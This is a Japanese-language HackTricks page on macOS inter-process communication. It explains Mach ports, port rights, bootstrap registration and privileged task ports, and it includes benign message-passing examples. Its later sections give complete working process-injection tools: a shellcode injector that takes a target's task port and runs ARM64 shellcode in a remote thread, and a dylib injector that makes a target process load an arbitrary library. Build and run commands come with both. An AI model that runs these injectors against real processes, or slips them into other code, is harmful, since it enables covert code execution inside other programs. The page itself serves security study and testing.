# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### 基本情報

Machはリソースを共有するための**最小単位**として**タスク**を使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドはPOSIXプロセスとスレッドに1:1でマッピングされます**。

タスク間の通信はMach Inter-Process Communication (IPC)を介して行われ、一方向の通信チャネルを利用します。**メッセージはポート間で転送され**、これらはカーネルによって管理される**メッセージキュー**のように機能します。

各プロセスには**IPCテーブル**があり、そこには**プロセスのmachポート**を見つけることができます。machポートの名前は実際には番号（カーネルオブジェクトへのポインタ）です。

プロセスはまた、**異なるタスクにポート名を権利と共に送信**することができ、カーネルはこのエントリを**他のタスクのIPCテーブル**に表示させます。

### ポート権限

ポート権限は、タスクが実行できる操作を定義し、この通信の鍵となります。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **受信権限**は、ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数のプロデューサー、単一のコンシューマー）キューであり、システム全体で**各ポートに対して1つの受信権限**しか存在できません（パイプとは異なり、複数のプロセスが1つのパイプの読み取り端にファイルディスクリプタを保持できます）。
- **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**することができ、メッセージを送信することができます。元々は**自分のタスクのみがポートに対して受信権限を持っています**。
- **送信権限**は、ポートにメッセージを送信することを許可します。
- 送信権限は**クローン**可能で、送信権限を持つタスクはその権限をクローンし、**第三のタスクに付与**することができます。
- **一度だけ送信権限**は、ポートに1つのメッセージを送信し、その後消失します。
- **ポートセット権限**は、単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、その中の1つのポートからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートを同時にリッスンするために使用できます。
- **デッドネーム**は実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限はデッドネームに変わります。

**タスクは他のタスクにSEND権限を転送**でき、メッセージを返送することが可能になります。**SEND権限もクローン可能で、タスクはその権限を複製し、第三のタスクに与えることができます**。これにより、**ブートストラップサーバー**と呼ばれる仲介プロセスと組み合わせて、タスク間の効果的な通信が可能になります。

### ファイルポート

ファイルポートは、Macポート内にファイルディスクリプタをカプセル化することを可能にします（Machポート権限を使用）。`fileport_makeport`を使用して指定されたFDから`fileport`を作成し、`fileport_makefd`を使用してファイルポートからFDを作成することができます。

### 通信の確立

#### ステップ：

通信チャネルを確立するために、**ブートストラップサーバー**（macの**launchd**）が関与します。

1. タスク**A**が**新しいポート**を開始し、その過程で**受信権限**を取得します。
2. タスク**A**は、受信権限の保持者として、**ポートの送信権限を生成**します。
3. タスク**A**は**ブートストラップサーバー**との**接続**を確立し、**ポートのサービス名**と**送信権限**をブートストラップ登録と呼ばれる手続きで提供します。
4. タスク**B**は**ブートストラップサーバー**と対話し、サービス名のブートストラップ**ルックアップ**を実行します。成功すると、**サーバーはタスクAから受け取った送信権限を複製し、タスクBに**送信します。
5. 送信権限を取得したタスク**B**は、**メッセージを作成**し、**タスクAに送信**することができます。
6. 双方向通信のために、通常タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、**送信権限をタスクAに与え**、タスクBにメッセージを送信できるようにします（双方向通信）。

ブートストラップサーバーは、タスクが主張するサービス名を**認証できません**。これは、**タスク**が任意のシステムタスクを**なりすます**可能性があることを意味し、偽の**認証サービス名を主張**し、すべてのリクエストを承認することができます。

その後、Appleは**システム提供サービスの名前**を安全な構成ファイルに保存し、**SIP保護された**ディレクトリに配置します：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。各サービス名に加えて、**関連するバイナリも保存されます**。ブートストラップサーバーは、これらのサービス名の**受信権限を作成し保持します**。

これらの事前定義されたサービスに対して、**ルックアッププロセスはわずかに異なります**。サービス名がルックアップされると、launchdはサービスを動的に開始します。新しいワークフローは次のようになります：

- タスク**B**がサービス名のブートストラップ**ルックアップ**を開始します。
- **launchd**はタスクが実行中かどうかを確認し、実行されていない場合は**開始**します。
- タスク**A**（サービス）は**ブートストラップチェックイン**を行います。ここで、**ブートストラップ**サーバーは送信権限を作成し、それを保持し、**受信権限をタスクAに転送します**。
- launchdは**送信権限を複製し、タスクBに送信します**。
- タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、**送信権限をタスクA**（svc）に与え、タスクBにメッセージを送信できるようにします（双方向通信）。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは元の説明通りに動作し、なりすましを許可する可能性があります。

### Machメッセージ

[こちらで詳細情報を見つけてください](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg`関数は、実質的にシステムコールであり、Machメッセージの送信と受信に使用されます。この関数は、送信されるメッセージを最初の引数として必要とします。このメッセージは、`mach_msg_header_t`構造体で始まり、その後に実際のメッセージ内容が続きます。この構造体は次のように定義されています：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
プロセスが _**受信権**_ を持っている場合、Machポートでメッセージを受信できます。逆に、**送信者**には _**送信**_ または _**一度だけ送信する権利**_ が付与されます。一度だけ送信する権利は、単一のメッセージを送信するためのもので、その後無効になります。

簡単な **双方向通信** を実現するために、プロセスはメッセージの **ヘッダー** にある **machポート** を指定できます。このポートは _返信ポート_ (**`msgh_local_port`**) と呼ばれ、メッセージの **受信者** がこのメッセージに **返信を送信** できる場所です。**`msgh_bits`** のビットフラグを使用して、このポートに対して **一度だけ送信する権利** を導出し、転送することができます (`MACH_MSG_TYPE_MAKE_SEND_ONCE`)。

> [!TIP]
> この種の双方向通信は、リプレイを期待するXPCメッセージで使用されることに注意してください (`xpc_connection_send_message_with_reply` および `xpc_connection_send_message_with_reply_sync`)。しかし、**通常は異なるポートが作成され**、前述のように双方向通信を作成します。

メッセージヘッダーの他のフィールドは次のとおりです：

- `msgh_size`: パケット全体のサイズ。
- `msgh_remote_port`: このメッセージが送信されるポート。
- `msgh_voucher_port`: [machバウチャー](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`: このメッセージのIDで、受信者によって解釈されます。

> [!CAUTION]
> **machメッセージは\_machポート**\_を介して送信されます。これは、machカーネルに組み込まれた **単一受信者**、**複数送信者** の通信チャネルです。**複数のプロセス**がmachポートに **メッセージを送信** できますが、いつでも **単一のプロセスのみが** そこから読み取ることができます。

### ポートの列挙
```bash
lsmp -p <pid>
```
このツールは、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてiOSにインストールできます。

### コード例

**送信者**がポートを**割り当て**、名前 `org.darlinghq.example` のための**送信権**を作成し、それを**ブートストラップサーバー**に送信する様子に注意してください。送信者はその名前の**送信権**を要求し、それを使って**メッセージを送信**しました。

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### 特権ポート

- **ホストポート**: プロセスがこのポートに対して**Send**権限を持っている場合、**システム**に関する**情報**を取得できます（例: `host_processor_info`）。
- **ホスト特権ポート**: このポートに対して**Send**権限を持つプロセスは、カーネル拡張を読み込むなどの**特権アクション**を実行できます。この**権限を得るにはプロセスがrootである必要があります**。
- さらに、**`kext_request`** APIを呼び出すには、他の権限**`com.apple.private.kext*`**を持っている必要があり、これはAppleのバイナリにのみ付与されます。
- **タスク名ポート**: _タスクポート_の特権のないバージョンです。タスクを参照しますが、制御することはできません。これを通じて利用できる唯一のものは`task_info()`のようです。
- **タスクポート**（別名カーネルポート）**:** このポートに対してSend権限を持つことで、タスクを制御することが可能です（メモリの読み書き、スレッドの作成など）。
- `mach_task_self()`を呼び出して、呼び出しタスクのこのポートの**名前**を取得します。このポートは**`exec()`**を通じてのみ**継承されます**; `fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリ内の`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行いながら["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)を実行することです。
- これらはポートにアクセスするための制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）:
- アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスがタスクポートにアクセスできます**（通常はデバッグのためにXcodeによって追加されます）。**ノータリゼーション**プロセスは、これを製品リリースには許可しません。
- **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得できます**。古いバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
- **Rootは、**ハードンされた**ランタイムでコンパイルされていないアプリケーションのタスクポートにアクセスできます**（Apple製でないもの）。

### タスクポート経由のスレッドへのシェルコード注入

シェルコードを取得するには:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**前のプログラムをコンパイル**し、同じユーザーでコードを注入できるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### スレッドを介したDylibインジェクション

macOSでは、**スレッド**は**Mach**または**posix `pthread` API**を使用して操作できます。前回のインジェクションで生成したスレッドはMach APIを使用して生成されたため、**posix準拠ではありません**。

**posix**準拠のAPIを使用する必要がなかったため、**コマンドを実行するためのシンプルなシェルコードを注入する**ことが可能でした。**より複雑なインジェクション**では、**スレッド**も**posix準拠である必要があります**。

したがって、**スレッドを改善するためには**、**`pthread_create_from_mach_thread`**を呼び出す必要があります。これにより、**有効なpthreadが作成されます**。次に、この新しいpthreadが**dlopenを呼び出して**システムから**dylibをロード**できるようになります。異なるアクションを実行するために新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

**例のdylibs**は以下にあります（例えば、ログを生成し、その後リスニングできるもの）：

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### スレッドハイジャックによるタスクポート <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この技術では、プロセスのスレッドがハイジャックされます：

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### 基本情報

XPCは、macOSおよびiOS上のプロセス間通信のためのフレームワークで、XNU（macOSで使用されるカーネル）を意味します。XPCは、システム上の異なるプロセス間で**安全で非同期のメソッド呼び出し**を行うためのメカニズムを提供します。これはAppleのセキュリティパラダイムの一部であり、各**コンポーネント**がその仕事を行うために必要な**権限のみ**で実行される**特権分離アプリケーション**の**作成**を可能にします。これにより、侵害されたプロセスからの潜在的な損害を制限します。

この**通信がどのように機能するか**、およびそれが**どのように脆弱である可能性があるか**についての詳細は、以下を確認してください：

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Machインターフェースジェネレーター

MIGは、**Mach IPC**コード作成のプロセスを**簡素化するため**に作成されました。基本的に、指定された定義に基づいてサーバーとクライアントが通信するために必要なコードを**生成**します。生成されたコードが醜い場合でも、開発者はそれをインポートするだけで、彼のコードは以前よりもはるかにシンプルになります。

詳細については、以下を確認してください：

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## 参考文献

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
